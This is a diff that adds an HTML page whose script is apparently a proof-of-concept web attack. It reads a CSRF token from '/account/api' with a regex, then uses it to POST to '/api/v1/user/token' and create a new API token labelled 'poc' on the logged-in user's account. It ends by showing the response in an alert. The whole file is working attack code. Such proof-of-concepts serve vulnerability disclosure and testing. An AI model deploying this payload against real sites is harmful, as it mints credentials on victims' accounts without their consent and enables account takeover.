@@ -1,0 +1,13 @@
+<html>
+<script>
+var request = new XMLHttpRequest();
+request.open('GET', '/account/api', false);
+request.send(null);
+var csrf = request.responseText.match(/CSRFToken = '([^']*)/)[1];
+request.open('POST', '/api/v1/user/token', false);
+request.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
+request.setRequestHeader('X-CSRFToken', csrf);
+request.send('{"label":"poc"}');
+alert(request.responseText);
+</script>
+</html>
